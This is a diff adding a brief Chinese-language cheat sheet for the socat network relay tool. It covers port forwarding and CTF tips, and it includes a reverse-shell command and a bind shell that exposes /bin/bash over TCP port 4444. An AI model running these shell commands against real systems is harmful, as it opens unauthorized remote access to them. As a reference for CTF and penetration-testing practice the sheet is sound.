@@ -1,0 +1,18 @@
+socat - 双向数据流中继
+=======================
+
+简介：多功能网络中继工具，比nc更强大灵活。
+
+常用命令：
+  socat TCP-LISTEN:8080,fork TCP:target:80      端口转发
+  socat TCP-LISTEN:4444,fork TCP:localhost:1234 本地转发
+  socat file:`tty`,raw,echo=0 tcp:target:4444   反弹shell
+  socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash  监听shell
+
+交互模式：
+  socat - TCP:target:80                连接目标端口
+  socat - TCP:target:80,bind-src-addr=1.2.3.4  指定源IP
+
+CTF常用技巧：
+  socat TCP-LISTEN:9999,fork TCP:target:8888   流量转发
+  用socat替代nc进行交互式shell连接
